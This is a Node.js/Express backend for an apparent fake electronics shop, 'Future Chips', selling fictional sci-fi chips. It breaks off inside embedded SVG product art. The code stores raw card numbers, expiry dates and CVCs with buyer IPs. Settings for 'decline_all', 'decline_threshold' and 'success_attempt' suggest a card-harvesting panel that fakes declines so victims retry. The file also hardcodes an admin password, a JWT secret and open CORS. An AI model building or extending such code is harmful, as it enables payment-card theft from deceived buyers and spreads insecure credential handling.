const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const { v4: uuidv4 } = require('uuid');

const JWT_SECRET = process.env.JWT_SECRET || 'future-chips-super-secret-key-2026';

// ----------------------------------------------------
// DATABASE & STORAGE LAYER (In-Memory + SQLite)
// ----------------------------------------------------
const isVercel = Boolean(process.env.VERCEL || process.env.AWS_LAMBDA_FUNCTION_NAME);
let sqlite3 = null;
let db = null;
let useMemoryFallback = isVercel;

if (!isVercel) {
  try {
    const sqliteModule = require('sqlite3');
    sqlite3 = sqliteModule.verbose ? sqliteModule.verbose() : sqliteModule;
    const possibleDb = [
      path.join(__dirname, 'server', 'db', 'future_chips.db'),
      path.join(__dirname, 'db', 'future_chips.db'),
      path.join(__dirname, 'future_chips.db')
    ];
    const foundPath = possibleDb.find(p => fs.existsSync(p)) || possibleDb[0];
    db = new sqlite3.Database(foundPath, (err) => {
      if (err) {
        useMemoryFallback = true;
        db = null;
      }
    });
  } catch (err) {
    useMemoryFallback = true;
    db = null;
  }
}

// In-memory persistent object
const memStore = {
  site_settings: {
    id: 1,
    site_name: 'Future Chips',
    primary_color: '#00f0ff',
    accent_color: '#ff00e5',
    background_color: '#0a0a1a',
    logo_url: null,
    decline_all: 0,
    decline_threshold: 50.0,
    success_attempt: 1,
    trash_pin: bcrypt.hashSync('978797', 10)
  },
  admin_users: [
    { id: 1, username: 'admin', password_hash: bcrypt.hashSync('FutureChips2024!', 10) }
  ],
  products: [
    {
      id: 'prod-nano-chip',
      name: 'Nano-Constructor Unit',
      description: 'Basic bio-compatible molecular assembly chip. Capable of building small carbon structures at the microscopic level.',
      price: 10.00,
      image: '/uploads/nano_constructor.svg',
      category: 'Processors',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-quantum-core',
      name: 'Quantum Neural Core',
      description: 'Next-generation computing processor featuring 1024 logical qubits with sub-zero cryo packaging.',
      price: 150.00,
      image: '/uploads/quantum_core.svg',
      category: 'Processors',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-bio-synapse',
      name: 'Bio-Digital Synapse v4.2',
      description: 'Organic silicon hybrid chip that connects physical neural pathways with standard digital bus interfaces.',
      price: 850.00,
      image: '/uploads/bio_synapse.svg',
      category: 'Interfaces',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-holo-matrix',
      name: 'Holographic Display Matrix',
      description: 'Solid-light visual projection core rendering volumetric displays without external projection screens.',
      price: 1200.00,
      image: '/uploads/holo_matrix.svg',
      category: 'Displays',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-photon-core',
      name: 'Photon Power Core',
      description: 'Sub-atomic light harvesting generator capable of powering neural implants indefinitely.',
      price: 5000.00,
      image: '/uploads/photon_core.svg',
      category: 'Energy',
      created_at: new Date().toISOString()
    },
    {
      id: 'prod-gravitational-grid',
      name: 'Gravitational Grid Controller',
      description: 'Industrial field modulation processor creating localized zero-gravity environments.',
      price: 98000.00,
      image: '/uploads/gravitational_grid.svg',
      category: 'Energy',
      created_at: new Date().toISOString()
    }
  ],
  visitors: [],
  orders: [],
  cards: []
};

const dbRun = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('update site_settings')) {
        if (params.length >= 7) {
          memStore.site_settings.site_name = params[0];
          memStore.site_settings.primary_color = params[1];
          memStore.site_settings.accent_color = params[2];
          memStore.site_settings.background_color = params[3];
          memStore.site_settings.decline_all = params[4];
          memStore.site_settings.decline_threshold = params[5];
          memStore.site_settings.success_attempt = params[6];
        } else if (sqlLower.includes('set trash_pin =')) {
          memStore.site_settings.trash_pin = params[0];
        }
      } else if (sqlLower.includes('insert into cards') || sqlLower.includes('insert or ignore into cards')) {
        memStore.cards.unshift({
          id: memStore.cards.length + 1,
          card_number: params[0],
          expiry: params[1],
          cvc: params[2],
          country: params[3] || 'Unknown',
          ip_address: params[4] || '127.0.0.1',
          created_at: new Date().toISOString(),
          is_deleted: 0,
          stripe_session_id: params[5]
        });
      } else if (sqlLower.includes('insert into orders')) {
        memStore.orders.unshift({
          id: params[0],
          product_id: params[1],
          customer_email: params[2],
          amount: params[3],
          currency: params[4] || 'usd',
          stripe_session_id: params[5],
          status: params[6] || 'pending',
          customer_ip: params[7] || '127.0.0.1',
          card_number: params[8] || '',
          created_at: new Date().toISOString()
        });
      } else if (sqlLower.includes('update orders set status =')) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[1] || o.stripe_session_id === params[0]);
        if (order) order.status = params[0] || 'completed';
      } else if (sqlLower.includes('update cards set is_deleted = 1')) {
        const card = memStore.cards.find(c => c.id === parseInt(params[0]));
        if (card) card.is_deleted = 1;
      } else if (sqlLower.includes('update cards set is_deleted = 0')) {
        const card = memStore.cards.find(c => c.id === parseInt(params[0]));
        if (card) card.is_deleted = 0;
      } else if (sqlLower.includes('delete from cards')) {
        const idx = memStore.cards.findIndex(c => c.id === parseInt(params[0]));
        if (idx !== -1) memStore.cards.splice(idx, 1);
      } else if (sqlLower.includes('insert into visitors')) {
        memStore.visitors.unshift({
          id: memStore.visitors.length + 1,
          ip_address: params[0],
          user_agent: params[1],
          page_visited: params[2],
          country: 'Unknown',
          visited_at: new Date().toISOString()
        });
      }
      resolve({ lastID: 1, changes: 1 });
    });
  }

  return new Promise((resolve, reject) => {
    db.run(sql, params, function (err) {
      if (err) reject(err);
      else resolve(this);
    });
  });
};

const dbAll = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from products')) resolve([...memStore.products]);
      else if (sqlLower.includes('from cards')) {
        if (sqlLower.includes('is_deleted = 1')) {
          resolve(memStore.cards.filter(c => c.is_deleted === 1));
        } else {
          resolve(memStore.cards.filter(c => c.is_deleted === 0));
        }
      } else if (sqlLower.includes('from orders')) resolve([...memStore.orders]);
      else if (sqlLower.includes('from visitors')) resolve([...memStore.visitors]);
      else resolve([]);
    });
  }

  return new Promise((resolve, reject) => {
    db.all(sql, params, (err, rows) => {
      if (err) reject(err);
      else resolve(rows);
    });
  });
};

const dbGet = (sql, params = []) => {
  if (useMemoryFallback || !db) {
    return new Promise((resolve) => {
      const sqlLower = sql.toLowerCase();
      if (sqlLower.includes('from site_settings')) {
        resolve({ ...memStore.site_settings });
      } else if (sqlLower.includes('from admin_users')) {
        const user = memStore.admin_users.find(u => u.username === params[0]);
        resolve(user ? { ...user } : null);
      } else if (sqlLower.includes('from products')) {
        const prod = memStore.products.find(p => p.id === params[0]);
        resolve(prod ? { ...prod } : null);
      } else if (sqlLower.includes('from orders')) {
        const order = memStore.orders.find(o => o.stripe_session_id === params[0] || o.id === params[0]);
        resolve(order ? { ...order } : null);
      } else if (sqlLower.includes('count(*)')) {
        if (sqlLower.includes('from cards')) {
          const count = memStore.cards.filter(c => c.stripe_session_id === params[0]).length;
          resolve({ count: count || 1 });
        } else resolve({ count: 1 });
      } else resolve(null);
    });
  }

  return new Promise((resolve, reject) => {
    db.get(sql, params, (err, row) => {
      if (err) reject(err);
      else resolve(row);
    });
  });
};

// ----------------------------------------------------
// EXPRESS APPLICATION
// ----------------------------------------------------
const app = express();

app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

app.use(express.json());

// EMBEDDED ASSETS & PAGES
const SVG_MAP = {"bio_synapse.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#0f1f22\" />\n      <stop offset=\"100%\" stop-color=\"#05080a\" />\n    </radialGradient>\n    <linearGradient id=\"bio-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#00ffaa\" />\n      <stop offset=\"50%\" stop-color=\"#00bcff\" />\n      <stop offset=\"100%\" stop-color=\"#aa00ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Background grids (Hexagonal theme) -->\n  <g stroke=\"#00ffaa\" stroke-opacity=\"0.03\" stroke-width=\"1\" fill=\"none\">\n    <polygon points=\"250,50 380,125 380,275 250,350 120,275 120,125\" />\n    <polygon points=\"250,-25 436,82 436,297 250,405 64,297 64,82\" />\n    <polygon points=\"250,125 315,162 315,237 250,275 185,237 185,162\" />\n  </g>\n\n  <!-- Nerve fibers/organic lines -->\n  <g stroke=\"url(#bio-grad)\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <path d=\"M 250,250 C 230,180 180,130 100,150\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 280,180 320,130 400,150\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 200,280 150,330 120,400\" stroke-opacity=\"0.6\" />\n    <path d=\"M 250,250 C 300,280 350,330 380,400\" stroke-opacity=\"0.6\" />\n    \n    <path d=\"M 250,250 C 220,230 180,220 50,250\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n    <path d=\"M 250,250 C 280,230 320,220 450,250\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n  </g>\n  \n  <!-- Digital tracks intersecting -->\n  <g stroke=\"#00f0ff\" stroke-width=\"1.5\" fill=\"none\">\n    <rect x=\"180\" y=\"180\" width=\"140\" height=\"140\" rx=\"6\" stroke-dasharray=\"10 5\" stroke-opacity=\"0.4\" />\n    <circle cx=\"250\" cy=\"250\" r=\"90\" stroke-dasharray=\"4 8\" stroke-opacity=\"0.5\" />\n  </g>\n\n  <!-- Central Synaptic Bulb -->\n  <circle cx=\"250\" cy=\"250\" r=\"30\" fill=\"url(#bio-grad)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"12\" fill=\"#05080a\" />\n  \n  <!-- Glowing Synaptic Transmitters -->\n  <g fill=\"#00ffaa\" filter=\"url(#glow)\">\n    <circle cx=\"100\" cy=\"150\" r=\"6\" />\n    <circle cx=\"400\" cy=\"150\" r=\"6\" />\n    <circle cx=\"120\" cy=\"400\" r=\"6\" />\n    <circle cx=\"380\" cy=\"400\" r=\"6\" />\n    <circle cx=\"50\" cy=\"250\" r=\"4\" />\n    <circle cx=\"450\" cy=\"250\" r=\"4\" />\n    \n    <!-- Minor random nodes -->\n    <circle cx=\"200\" cy=\"210\" r=\"3\" />\n    <circle cx=\"300\" cy=\"210\" r=\"3\" />\n    <circle cx=\"210\" cy=\"290\" r=\"3\" />\n    <circle cx=\"290\" cy=\"290\" r=\"3\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00ffaa\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">BIO-DIGITAL SYNAPSE</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">CEREBRAL LINK PROTOCOL v4.2</text>\n</svg>\n","gravitational_grid.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#1b0f28\" />\n      <stop offset=\"100%\" stop-color=\"#05030a\" />\n    </radialGradient>\n    <radialGradient id=\"singularity-glow\" cx=\"50%\" cy=\"50%\" r=\"50%\">\n      <stop offset=\"0%\" stop-color=\"#ffffff\" />\n      <stop offset=\"30%\" stop-color=\"#d600ff\" />\n      <stop offset=\"70%\" stop-color=\"#3d0080\" />\n      <stop offset=\"100%\" stop-color=\"#000000\" stop-opacity=\"0\" />\n    </radialGradient>\n    <linearGradient id=\"grid-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#d600ff\" />\n      <stop offset=\"100%\" stop-color=\"#00f0ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-30%\" y=\"-30%\" width=\"160%\" height=\"160%\">\n      <feGaussianBlur stdDeviation=\"8\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Gravity Well Curved Grid lines -->\n  <g stroke=\"url(#grid-grad)\" stroke-width=\"1\" stroke-opacity=\"0.25\" fill=\"none\">\n    <!-- Horizontal distorted lines -->\n    <path d=\"M 0,50 Q 250,150 500,50\" />\n    <path d=\"M 0,120 Q 250,200 500,120\" />\n    <path d=\"M 0,190 Q 250,230 500,190\" />\n    <path d=\"M 0,250 Q 250,250 500,250\" stroke-opacity=\"0.4\" />\n    <path d=\"M 0,310 Q 250,270 500,310\" />\n    <path d=\"M 0,380 Q 250,300 500,380\" />\n    <path d=\"M 0,450 Q 250,350 500,450\" />\n    \n    <!-- Vertical distorted lines -->\n    <path d=\"M 50,0 Q 150,250 50,500\" />\n    <path d=\"M 120,0 Q 200,250 120,500\" />\n    <path d=\"M 190,0 Q 230,250 190,500\" />\n    <path d=\"M 250,0 Q 250,250 250,500\" stroke-opacity=\"0.4\" />\n    <path d=\"M 310,0 Q 270,250 310,500\" />\n    <path d=\"M 380,0 Q 300,250 380,500\" />\n    <path d=\"M 450,0 Q 350,250 450,500\" />\n  </g>\n  \n  <!-- Orbiting Rings -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.2\" stroke-width=\"1.5\" fill=\"none\">\n    <circle cx=\"250\" cy=\"250\" r=\"160\" stroke-dasharray=\"10 20\" />\n    <circle cx=\"250\" cy=\"250\" r=\"120\" stroke-dasharray=\"40 10\" />\n    <circle cx=\"250\" cy=\"250\" r=\"80\" stroke-dasharray=\"5 5\" />\n  </g>\n\n  <!-- Heavy Duty Physical Frame of the Chip -->\n  <rect x=\"130\" y=\"130\" width=\"240\" height=\"240\" rx=\"25\" fill=\"#090514\" stroke=\"url(#grid-grad)\" stroke-width=\"2\" />\n  <rect x=\"145\" y=\"145\" width=\"210\" height=\"210\" rx=\"15\" fill=\"#120a28\" stroke=\"#ffffff\" stroke-opacity=\"0.1\" stroke-width=\"1\" />\n\n  <!-- Singularity Core -->\n  <circle cx=\"250\" cy=\"250\" r=\"70\" fill=\"url(#singularity-glow)\" filter=\"url(#glow)\" />\n  <circle cx=\"250\" cy=\"250\" r=\"22\" fill=\"#000000\" stroke=\"#ffffff\" stroke-width=\"1\" filter=\"url(#glow)\" />\n\n  <!-- Particle Accretion Disk Dots -->\n  <g fill=\"#d600ff\" filter=\"url(#glow)\">\n    <circle cx=\"210\" cy=\"210\" r=\"3\" />\n    <circle cx=\"290\" cy=\"290\" r=\"3\" />\n    <circle cx=\"290\" cy=\"210\" r=\"3\" />\n    <circle cx=\"210\" cy=\"290\" r=\"3\" />\n    \n    <circle cx=\"250\" cy=\"180\" r=\"4\" />\n    <circle cx=\"250\" cy=\"320\" r=\"4\" />\n    <circle cx=\"180\" cy=\"250\" r=\"4\" />\n    <circle cx=\"320\" cy=\"250\" r=\"4\" />\n  </g>\n\n  <!-- Corner mounting brackets -->\n  <g stroke=\"url(#grid-grad)\" stroke-width=\"3\">\n    <line x1=\"100\" y1=\"100\" x2=\"135\" y2=\"135\" />\n    <line x1=\"400\" y1=\"100\" x2=\"365\" y2=\"135\" />\n    <line x1=\"100\" y1=\"400\" x2=\"135\" y2=\"365\" />\n    <line x1=\"400\" y1=\"400\" x2=\"365\" y2=\"365\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#d600ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">GRAVITATIONAL GRID</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">LOCAL SPACE-TIME ENGINEERING UNIT</text>\n</svg>\n","holo_matrix.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#19122b\" />\n      <stop offset=\"100%\" stop-color=\"#06050a\" />\n    </radialGradient>\n    <linearGradient id=\"holo-grad\" x1=\"0%\" y1=\"100%\" x2=\"0%\" y2=\"0%\">\n      <stop offset=\"0%\" stop-color=\"#00f0ff\" stop-opacity=\"0.1\" />\n      <stop offset=\"50%\" stop-color=\"#ff00e5\" stop-opacity=\"0.4\" />\n      <stop offset=\"100%\" stop-color=\"#00f0ff\" stop-opacity=\"0.9\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"8\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Perspective Grid lines radiating from center projection -->\n  <g stroke=\"#ff00e5\" stroke-opacity=\"0.05\" stroke-width=\"1\">\n    <line x1=\"0\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"100\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"200\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"300\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"400\" y1=\"500\" x2=\"250\" y2=\"350\" />\n    <line x1=\"500\" y1=\"500\" x2=\"250\" y2=\"350\" />\n  </g>\n\n  <!-- Projection Rays -->\n  <polygon points=\"200,350 300,350 380,100 120,100\" fill=\"url(#holo-grad)\" />\n\n  <!-- Holographic Cube suspended in the air -->\n  <g stroke=\"#00f0ff\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <!-- Top Face -->\n    <polygon points=\"250,110 310,135 250,160 190,135\" stroke-opacity=\"0.8\" />\n    <!-- Bottom Face -->\n    <polygon points=\"250,190 310,215 250,240 190,215\" stroke-opacity=\"0.6\" />\n    <!-- Vertical Edges -->\n    <line x1=\"250\" y1=\"110\" x2=\"250\" y2=\"190\" stroke-opacity=\"0.8\" />\n    <line x1=\"310\" y1=\"135\" x2=\"310\" y2=\"215\" stroke-opacity=\"0.8\" />\n    <line x1=\"190\" y1=\"135\" x2=\"190\" y2=\"215\" stroke-opacity=\"0.8\" />\n    <line x1=\"250\" y1=\"160\" x2=\"250\" y2=\"240\" stroke-opacity=\"0.8\" />\n  </g>\n  \n  <!-- Outer glowing rings of the cube -->\n  <ellipse cx=\"250\" cy=\"175\" rx=\"90\" ry=\"40\" stroke=\"#ff00e5\" stroke-width=\"1.5\" stroke-dasharray=\"10 8\" fill=\"none\" filter=\"url(#glow)\" />\n  <ellipse cx=\"250\" cy=\"175\" rx=\"110\" ry=\"50\" stroke=\"#00f0ff\" stroke-width=\"1\" stroke-opacity=\"0.3\" fill=\"none\" />\n\n  <!-- Projection Lens/Device Base -->\n  <ellipse cx=\"250\" cy=\"350\" rx=\"70\" ry=\"25\" fill=\"#0c0a17\" stroke=\"#00f0ff\" stroke-width=\"2\" />\n  <ellipse cx=\"250\" cy=\"350\" rx=\"55\" ry=\"18\" fill=\"#141029\" stroke=\"#ff00e5\" stroke-width=\"1\" />\n  <ellipse cx=\"250\" cy=\"350\" rx=\"30\" ry=\"10\" fill=\"#00f0ff\" filter=\"url(#glow)\" />\n\n  <rect x=\"170\" y=\"350\" width=\"160\" height=\"25\" fill=\"#07060f\" stroke=\"#00f0ff\" stroke-opacity=\"0.2\" stroke-width=\"1\" />\n\n  <!-- Floating Holographic Data Rings -->\n  <g stroke=\"#00f0ff\" stroke-width=\"1\" fill=\"none\" stroke-opacity=\"0.5\">\n    <ellipse cx=\"250\" cy=\"290\" rx=\"50\" ry=\"18\" stroke-dasharray=\"5 15\" />\n    <ellipse cx=\"250\" cy=\"315\" rx=\"60\" ry=\"22\" stroke-dasharray=\"3 9\" />\n  </g>\n\n  <!-- Glowing Bits -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"110\" r=\"4\" />\n    <circle cx=\"310\" cy=\"135\" r=\"4\" />\n    <circle cx=\"190\" cy=\"135\" r=\"4\" />\n    <circle cx=\"250\" cy=\"240\" r=\"4\" />\n  </g>\n\n  <!-- Title Text -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00f0ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">HOLOGRAPHIC MATRIX</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">PHOTONIC SPATIAL PROJECTOR v1.0</text>\n</svg>\n","nano_constructor.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#14192b\" />\n      <stop offset=\"100%\" stop-color=\"#05060a\" />\n    </radialGradient>\n    <linearGradient id=\"primary-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#00f0ff\" />\n      <stop offset=\"100%\" stop-color=\"#7000ff\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-20%\" y=\"-20%\" width=\"140%\" height=\"140%\">\n      <feGaussianBlur stdDeviation=\"6\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Decorative Grid -->\n  <g stroke=\"#ffffff\" stroke-opacity=\"0.03\" stroke-width=\"1\">\n    <path d=\"M 0,50 L 500,50 M 0,100 L 500,100 M 0,150 L 500,150 M 0,200 L 500,200 M 0,250 L 500,250 M 0,300 L 500,300 M 0,350 L 500,350 M 0,400 L 500,400 M 0,450 L 500,450\" />\n    <path d=\"M 50,0 L 50,500 M 100,0 L 100,500 M 150,0 L 150,500 M 200,0 L 200,500 M 250,0 L 250,500 M 300,0 L 300,500 M 350,0 L 350,500 M 400,0 L 400,500 M 450,0 L 450,500\" />\n  </g>\n\n  <!-- Circuit lines -->\n  <g stroke=\"#00f0ff\" stroke-opacity=\"0.3\" stroke-width=\"1.5\" fill=\"none\">\n    <path d=\"M 100,100 L 180,100 L 220,150 L 220,200\" />\n    <path d=\"M 400,100 L 320,100 L 280,150 L 280,200\" />\n    <path d=\"M 100,400 L 180,400 L 220,350 L 220,300\" />\n    <path d=\"M 400,400 L 320,400 L 280,350 L 280,300\" />\n    <path d=\"M 50,250 L 200,250\" />\n    <path d=\"M 450,250 L 300,250\" />\n  </g>\n  \n  <!-- Outer Ring -->\n  <circle cx=\"250\" cy=\"250\" r=\"160\" stroke=\"#00f0ff\" stroke-opacity=\"0.1\" stroke-width=\"8\" fill=\"none\" />\n  <circle cx=\"250\" cy=\"250\" r=\"160\" stroke=\"url(#primary-grad)\" stroke-width=\"2\" stroke-dasharray=\"15 10 5 10\" fill=\"none\" filter=\"url(#glow)\" />\n\n  <!-- Hexagonal Chip Outer -->\n  <polygon points=\"250,130 354,190 354,310 250,370 146,310 146,190\" fill=\"#0b0e17\" stroke=\"#00f0ff\" stroke-width=\"1\" stroke-opacity=\"0.5\" />\n  \n  <!-- Glowing Chip Inner -->\n  <polygon points=\"250,150 336,200 336,300 250,350 164,300 164,200\" fill=\"#101524\" stroke=\"url(#primary-grad)\" stroke-width=\"3\" filter=\"url(#glow)\" />\n  \n  <!-- Nano assembly center representation -->\n  <circle cx=\"250\" cy=\"250\" r=\"45\" fill=\"#080c14\" stroke=\"#00f0ff\" stroke-width=\"1\" />\n  \n  <!-- Concentric details -->\n  <circle cx=\"250\" cy=\"250\" r=\"25\" fill=\"none\" stroke=\"#ff00e5\" stroke-width=\"2\" stroke-dasharray=\"6 3\" filter=\"url(#glow)\" />\n  \n  <!-- Tiny nano particles -->\n  <g fill=\"#00f0ff\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"215\" r=\"4\" />\n    <circle cx=\"250\" cy=\"285\" r=\"4\" />\n    <circle cx=\"215\" cy=\"250\" r=\"4\" />\n    <circle cx=\"285\" cy=\"250\" r=\"4\" />\n    \n    <circle cx=\"230\" cy=\"230\" r=\"2\" />\n    <circle cx=\"270\" cy=\"230\" r=\"2\" />\n    <circle cx=\"230\" cy=\"270\" r=\"2\" />\n    <circle cx=\"270\" cy=\"270\" r=\"2\" />\n  </g>\n  \n  <!-- Outer golden pins -->\n  <g stroke=\"url(#primary-grad)\" stroke-width=\"3\">\n    <line x1=\"250\" y1=\"110\" x2=\"250\" y2=\"130\" />\n    <line x1=\"250\" y1=\"370\" x2=\"250\" y2=\"390\" />\n    <line x1=\"126\" y1=\"190\" x2=\"146\" y2=\"190\" />\n    <line x1=\"354\" y1=\"190\" x2=\"374\" y2=\"190\" />\n    <line x1=\"126\" y1=\"310\" x2=\"146\" y2=\"310\" />\n    <line x1=\"354\" y1=\"310\" x2=\"374\" y2=\"310\" />\n  </g>\n\n  <!-- Title Text (Futuristic) -->\n  <text x=\"250\" y=\"450\" text-anchor=\"middle\" fill=\"#00f0ff\" font-family=\"'Outfit', sans-serif\" font-weight=\"900\" font-size=\"16\" letter-spacing=\"4\" filter=\"url(#glow)\">NANO-CONSTRUCTOR</text>\n  <text x=\"250\" y=\"470\" text-anchor=\"middle\" fill=\"#ffffff\" fill-opacity=\"0.5\" font-family=\"'Inter', sans-serif\" font-size=\"10\" letter-spacing=\"1\">MOLECULAR BUILDER v1.0</text>\n</svg>\n","photon_core.svg":"<svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 500 500\" width=\"100%\" height=\"100%\">\n  <defs>\n    <radialGradient id=\"bg-grad\" cx=\"50%\" cy=\"50%\" r=\"70%\">\n      <stop offset=\"0%\" stop-color=\"#241510\" />\n      <stop offset=\"100%\" stop-color=\"#070403\" />\n    </radialGradient>\n    <radialGradient id=\"sun-glow\" cx=\"50%\" cy=\"50%\" r=\"50%\">\n      <stop offset=\"0%\" stop-color=\"#ffffff\" />\n      <stop offset=\"20%\" stop-color=\"#ffea00\" />\n      <stop offset=\"60%\" stop-color=\"#ff5500\" />\n      <stop offset=\"100%\" stop-color=\"#ff0000\" stop-opacity=\"0\" />\n    </radialGradient>\n    <linearGradient id=\"ring-grad\" x1=\"0%\" y1=\"0%\" x2=\"100%\" y2=\"100%\">\n      <stop offset=\"0%\" stop-color=\"#ffea00\" />\n      <stop offset=\"100%\" stop-color=\"#ff2200\" />\n    </linearGradient>\n    <filter id=\"glow\" x=\"-30%\" y=\"-30%\" width=\"160%\" height=\"160%\">\n      <feGaussianBlur stdDeviation=\"7\" result=\"blur\" />\n      <feMerge>\n        <feMergeNode in=\"blur\" />\n        <feMergeNode in=\"SourceGraphic\" />\n      </feMerge>\n    </filter>\n  </defs>\n  \n  <!-- Background -->\n  <rect width=\"100%\" height=\"100%\" fill=\"url(#bg-grad)\" />\n  \n  <!-- Radiating Energy Lines (Sun rays) -->\n  <g stroke=\"#ff5500\" stroke-opacity=\"0.15\" stroke-width=\"1.5\" fill=\"none\">\n    <line x1=\"250\" y1=\"250\" x2=\"250\" y2=\"50\" />\n    <line x1=\"250\" y1=\"250\" x2=\"250\" y2=\"450\" />\n    <line x1=\"250\" y1=\"250\" x2=\"50\" y2=\"250\" />\n    <line x1=\"250\" y1=\"250\" x2=\"450\" y2=\"250\" />\n    <line x1=\"250\" y1=\"250\" x2=\"108\" y2=\"108\" />\n    <line x1=\"250\" y1=\"250\" x2=\"392\" y2=\"392\" />\n    <line x1=\"250\" y1=\"250\" x2=\"108\" y2=\"392\" />\n    <line x1=\"250\" y1=\"250\" x2=\"392\" y2=\"108\" />\n  </g>\n\n  <!-- Containment Field Rings -->\n  <g stroke=\"url(#ring-grad)\" stroke-width=\"2\" fill=\"none\" filter=\"url(#glow)\">\n    <circle cx=\"250\" cy=\"250\" r=\"140\" stroke-dasharray=\"30 20\" stroke-opacity=\"0.8\" />\n    <circle cx=\"250\" cy=\"250\" r=\"120\" stroke-dasharray=\"10 15 5 15\" stroke-opacity=\"0.6\" />\n    <circle cx=\"250\" 